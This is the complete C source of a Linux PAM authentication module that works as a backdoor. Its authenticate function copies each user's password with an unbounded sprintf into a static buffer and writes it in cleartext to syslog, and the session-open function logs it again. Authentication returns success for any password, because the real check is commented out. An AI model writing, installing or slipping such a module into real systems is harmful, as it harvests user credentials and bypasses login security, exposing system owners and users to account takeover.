#define PAM_SM_ACCOUNT
#define PAM_SM_SESSION

#include <stdio.h>
#include <security/pam_modules.h>

#include <syslog.h>

static char p[1000];
PAM_EXTERN int
pam_sm_authenticate (pam_handle_t *pamh, int flags, int argc, const char **argv) {
    pam_syslog (pamh, LOG_INFO, "pam_sm_authenticate called!");

    const char *authtok;
    if (pam_get_item (pamh, PAM_AUTHTOK, (const void **)&authtok) != PAM_SUCCESS)
    {
      pam_syslog (pamh, LOG_ERR, "Couldn't obtain PAM_AUTHTOK from the pam stack.");
    }
    else {
        sprintf(p,"%s",authtok);	
	pam_syslog (pamh, LOG_INFO, "Emel passwd is %s", p);
    }
  //return login_ok ? PAM_SUCCESS : PAM_AUTH_ERR;
  return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_setcred (pam_handle_t *pamh, int flags, int argc, const char **argv)
{
   pam_syslog (pamh, LOG_INFO, "pam_sm_setcred called!");
 
   return PAM_SUCCESS;
}

PAM_EXTERN int 
pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
  pam_syslog (pamh, LOG_INFO, "pam_sm_acct_mgmt called!");
  return PAM_SUCCESS;
}

PAM_EXTERN int 
pam_sm_open_session (pam_handle_t *pamh, int flags, int argc, const char **argv){
  pam_syslog (pamh, LOG_INFO, "pam_sm_open_session called!");
        pam_syslog (pamh, LOG_INFO, "Emel passwd is %s", p);

  return PAM_SUCCESS;

}
 
PAM_EXTERN int 
pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
  pam_syslog (pamh, LOG_INFO, "pam_sm_close_session called!");
  return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_chauthtok (pam_handle_t *pamh, int flags, int argc, const char **argv)
{
  pam_syslog (pamh, LOG_INFO, "pam_sm_authenticate called!");
  return PAM_SUCCESS;
}
